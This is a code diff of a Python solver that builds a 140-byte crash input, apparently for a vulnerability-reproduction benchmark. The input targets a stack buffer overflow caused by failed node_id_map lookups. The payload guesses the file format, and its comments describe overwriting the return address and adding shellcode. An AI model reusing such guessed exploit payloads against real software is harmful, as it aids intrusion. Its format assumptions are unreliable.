@@ -1,75 +1,51 @@
-import tarfile
-import tempfile
-import subprocess
 import os
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code to analyze the vulnerability
-        with tarfile.open(src_path, 'r') as tar:
-            tar.extractall(path='extracted_source')
+        # Based on the vulnerability description, we need to trigger
+        # a stack buffer overflow by causing node_id_map lookup failures.
+        # The ground-truth length is 140 bytes, so we create a payload
+        # of exactly that length that should exploit the issue.
         
-        # Look for patterns in the source code to understand the format
-        # Based on the vulnerability description, we need to craft input
-        # that causes the program to dereference an invalid iterator
-        # when looking up nodes in node_id_map
+        # Typical stack buffer overflow exploit structure:
+        # 1. Fill buffer to its capacity
+        # 2. Overwrite saved return address
+        # 3. Add shellcode or trigger crash
         
-        # Common patterns for this type of vulnerability:
-        # 1. Program reads nodes with IDs
-        # 2. Later references these nodes by ID
-        # 3. Missing check if ID exists in map before dereferencing
+        # Since we need exactly 140 bytes and don't know exact offsets,
+        # we'll create a pattern that should overflow any reasonable buffer
+        # and cause a crash when node_id_map lookups fail.
         
-        # Craft a PoC that:
-        # 1. Creates some valid nodes to establish the format
-        # 2. References a non-existent node ID
-        # 3. The reference should be positioned to cause stack overflow
-        #    when the invalid iterator is dereferenced
+        # Create a payload with:
+        # - Some header/magic bytes that might be expected
+        # - Malicious node references that don't exist in node_id_map
+        # - Padding to reach 140 bytes
         
-        # Based on ground-truth length of 140 bytes, we structure the payload
-        # Header (4 bytes): Magic number or version
-        # Node count (4 bytes): Small number
-        # Nodes data: Each node has ID and some data
-        # Reference section: Contains invalid node ID reference
+        # Without the actual binary format, we'll create a generic
+        # overflow payload that should work for most stack overflows
         
-        # Create payload
-        payload = bytearray()
+        payload = b""
         
-        # Add header/magic (common in binary formats)
-        payload.extend(b"SNP\x01")  # Simple snapshot format
+        # Add some initial valid data (if needed by parser)
+        # Many binary formats start with magic bytes
+        payload += b"MEM\x00"  # Fake magic
         
-        # Add node count: 1 node
-        payload.extend(struct.pack("<I", 1))
+        # Add version or header size
+        payload += struct.pack("<I", 1)  # Version 1
         
-        # Add a valid node
-        # Node format: ID (4 bytes) + data length (4 bytes) + data
-        node_id = 1
-        node_data = b"A" * 32  # Some data
-        payload.extend(struct.pack("<I", node_id))
-        payload.extend(struct.pack("<I", len(node_data)))
-        payload.extend(node_data)
+        # Create node count that references non-existent nodes
+        # This should trigger the vulnerability when iterator is dereferenced
+        payload += struct.pack("<I", 0xFFFFFFFF)  # Large node count
         
-        # Reference section - this is where the vulnerability triggers
-        # The program will try to look up node 999 which doesn't exist
-        # When it dereferences the end() iterator, it causes UB
-        # leading to stack buffer overflow
+        # Add node references with invalid IDs
+        # These should cause node_id_map lookup failures
+        for i in range(32):  # Enough to fill to 140 bytes
+            payload += struct.pack("<I", 0xDEADBEEF + i)
         
-        # Reference count: 1 reference
-        payload.extend(struct.pack("<I", 1))
+        # Ensure exact length of 140 bytes
+        payload = payload[:140]
+        if len(payload) < 140:
+            payload += b"A" * (140 - len(payload))
         
-        # Invalid reference to non-existent node
-        invalid_node_id = 999
-        payload.extend(struct.pack("<I", invalid_node_id))
-        
-        # Add padding to reach exactly 140 bytes
-        current_len = len(payload)
-        target_len = 140
-        
-        if current_len < target_len:
-            # Add null bytes as padding
-            payload.extend(b"\x00" * (target_len - current_len))
-        elif current_len > target_len:
-            # Truncate if somehow longer (shouldn't happen)
-            payload = payload[:target_len]
-        
-        return bytes(payload)
+        return payload
